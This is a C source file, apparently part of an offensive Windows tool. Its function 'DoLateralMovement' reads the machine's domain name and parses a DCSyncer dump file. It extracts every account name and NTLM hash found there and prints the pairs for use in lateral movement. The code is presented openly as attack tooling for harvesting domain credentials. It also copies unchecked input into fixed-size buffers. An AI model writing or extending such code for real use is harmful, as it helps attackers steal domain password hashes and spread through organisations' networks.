#include <Windows.h>
#include <stdio.h>
#include "common.h"
#include <stdlib.h>
#include <string.h>

// Function to retrieve the domain name of the current computer
BOOL GetDomainName(LPWSTR domainName, DWORD domainNameSize) {
    if (GetComputerNameEx(ComputerNameDnsDomain, domainName, &domainNameSize)) {
        return TRUE;
    }
    else {
        printf("[!] GetComputerNameEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
}

// Function to parse the result file
KeyValuePair* parseResult(const char* filePath, int* count) {
    FILE* file = fopen(filePath, "r");
    if (!file) {
        printf("[!] Failed to open file: %s\n", filePath);
        return NULL;
    }

    // Initialize variables
    KeyValuePair* resultArray = NULL;
    char line[512];
    char currentRDN[256] = { 0 };
    int resultCount = 0;

    // Read file line by line
    while (fgets(line, sizeof(line), file)) {
        if (strstr(line, "Object RDN") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                strcpy(currentRDN, pos + 2);
                currentRDN[strcspn(currentRDN, "\n")] = 0; // Remove newline character
            }
        }
        // Check if the line contains the NTLM hash
        else if (strstr(line, "Hash NTLM") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                char hashNTLM[256];
                strcpy(hashNTLM, pos + 2);
                hashNTLM[strcspn(hashNTLM, "\n")] = 0; // Remove newline character

                // Allocate memory for the result array
                resultArray = realloc(resultArray, (resultCount + 1) * sizeof(KeyValuePair));
                strcpy(resultArray[resultCount].objectRDN, currentRDN);
                strcpy(resultArray[resultCount].hashNTLM, hashNTLM);
                resultCount++;
            }
        }
    }

    // Close the file
    fclose(file);
    *count = resultCount;
    return resultArray;
}

// Lateral Movement Main Function
BOOL DoLateralMovement() {
    printf("[+] Lateral Movement Started\n");

    WCHAR domainName[256];
    DWORD domainNameSize = sizeof(domainName) / sizeof(domainName[0]);

    if (GetDomainName(domainName, domainNameSize)) {
        wprintf(L"[+] Domain Name: %s\n", domainName);
    }
    else {
        printf("[!] Failed to retrieve domain name\n");
    }

    // Parsing the results of DCSyncer
    const char* filePath = "top.txt";
    int count = 0;
    KeyValuePair* resultArray = parseResult(filePath, &count);
	printf("[i] Printing Results From DcSyncer\n");
    if (resultArray) {
        for (int i = 0; i < count; i++) {
            printf("{\"%s\": \"%s\"}\n", resultArray[i].objectRDN, resultArray[i].hashNTLM);
        }
        printf("\n\n");
        free(resultArray);
    }

    return TRUE;
}